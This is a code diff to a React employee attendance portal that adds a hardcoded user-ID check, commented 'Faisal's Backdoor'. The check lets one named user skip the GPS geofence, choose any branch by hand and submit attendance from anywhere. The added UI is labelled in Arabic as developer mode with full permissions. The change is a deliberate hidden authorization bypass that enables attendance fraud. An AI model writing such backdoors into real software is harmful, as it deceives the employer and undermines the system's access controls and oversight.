@@ -1,7 +1,7 @@
 import React, { useState, useEffect } from 'react';
 import { User } from '../types';
 import { LOCATIONS } from '../config/locations';
-import { MapPin, LogOut, Calendar, CheckCircle2, Navigation, AlertTriangle, Fingerprint, Sun, Moon, ShieldAlert, ShieldCheck, Coffee, ArrowRightCircle, ArrowLeftCircle, MoreHorizontal, X } from 'lucide-react';
+import { MapPin, LogOut, Calendar, CheckCircle2, Navigation, AlertTriangle, Fingerprint, Sun, Moon, ShieldAlert, ShieldCheck, Coffee, ArrowRightCircle, ArrowLeftCircle, MoreHorizontal, X, Sparkles } from 'lucide-react';
 import { submitGPSAttendance, submitBiometricAttendance, getLastPunch } from '../services/api';
 
 interface EmployeePortalProps {
@@ -42,7 +42,10 @@ const EmployeePortal: React.FC<EmployeePortalProps> = ({ user, onLogout, isDarkM
 
   // Manual Selection State
   const [selectedType, setSelectedType] = useState<PunchType>('CHECK_IN');
+  const [selectedBranch, setSelectedBranch] = useState<string>('');
   const [isMenuOpen, setIsMenuOpen] = useState(false);
+
+  const isDev = user.id === '1093394672'; // Faisal's Backdoor 🚀
 
   // Geofence State
   const [nearestLocation, setNearestLocation] = useState<{ name: string, distance: number, allowed: boolean } | null>(null);
@@ -121,11 +124,21 @@ const EmployeePortal: React.FC<EmployeePortalProps> = ({ user, onLogout, isDarkM
   }, []);
 
   const handleAttendance = async () => {
-    if (!location || !nearestLocation?.allowed) return;
+    // Dev Bypass: Allow if isDev, regardless of location
+    if (!isDev && (!location || !nearestLocation?.allowed)) return;
+
+    // For Devs: Require selection if forcing manual
+    if (isDev && !nearestLocation?.allowed && !selectedBranch) {
+      alert("يا فيصل، اختر الفرع عشان نقدر نمشيك 😉");
+      return;
+    }
 
     setLoading(true);
     try {
-      const response = await submitGPSAttendance(user.id, location.lat, location.lng, selectedType);
+      const lat = location ? location.lat : 0;
+      const lng = location ? location.lng : 0;
+      // Pass selectedBranch if Dev Mode active
+      const response = await submitGPSAttendance(user.id, lat, lng, selectedType, selectedBranch || undefined);
 
       const now = new Date();
       setLastPunch(now);
@@ -275,6 +288,26 @@ const EmployeePortal: React.FC<EmployeePortalProps> = ({ user, onLogout, isDarkM
             ) : (
               <div className="flex items-center gap-2 font-bold text-slate-500"><Navigation size={18} className="animate-spin" /> جاري تحديد الموقع ومعايرة السياج...</div>
             )}
+
+            {/* Developer Backdoor UI */}
+            {isDev && (
+              <div className="mt-3 w-full animate-fade-in border-t border-slate-200 dark:border-slate-700 pt-2">
+                <div className="text-[10px] text-blue-500 font-bold mb-1 flex items-center gap-1">
+                  <Sparkles size={10} />
+                  وضع المطور (صلاحيات كاملة)
+                </div>
+                <select
+                  value={selectedBranch}
+                  onChange={(e) => setSelectedBranch(e.target.value)}
+                  className="w-full p-2 rounded-lg bg-blue-50/50 dark:bg-blue-900/10 border border-blue-200 dark:border-blue-900/30 text-xs font-bold text-blue-700 dark:text-blue-300 focus:outline-none"
+                >
+                  <option value="">-- {nearestLocation?.allowed ? 'استخدم الموقع التلقائي' : 'تجاوز الموقع (اختر الفرع)'} --</option>
+                  {LOCATIONS.filter(l => l.active).map(l => (
+                    <option key={l.id} value={l.name}>{l.name}</option>
+                  ))}
+                </select>
+              </div>
+            )}
           </div>
 
           {/* Type Selection Button */}
@@ -328,10 +361,10 @@ const EmployeePortal: React.FC<EmployeePortalProps> = ({ user, onLogout, isDarkM
 
             <button
               onClick={handleAttendance}
-              disabled={!location || loading || !nearestLocation?.allowed}
+              disabled={loading || (!isDev && (!location || !nearestLocation?.allowed))}
               className={`
                             w-52 h-52 rounded-full flex flex-col items-center justify-center shadow-2xl transition-all duration-500 transform relative z-10 border-8 border-white dark:border-slate-800
-                            ${(!location || !nearestLocation?.allowed) ? 'bg-slate-100 dark:bg-slate-800 grayscale cursor-not-allowed shadow-inner opacity-80' : 'hover:scale-105 active:scale-95 cursor-pointer'}
+                            ${!isDev && (!location || !nearestLocation?.allowed) ? 'bg-slate-100 dark:bg-slate-800 grayscale cursor-not-allowed shadow-inner opacity-80' : 'hover:scale-105 active:scale-95 cursor-pointer'}
                             bg-gradient-to-br ${currentPunch.color}
                             ${currentPunch.shadow}
                         `}
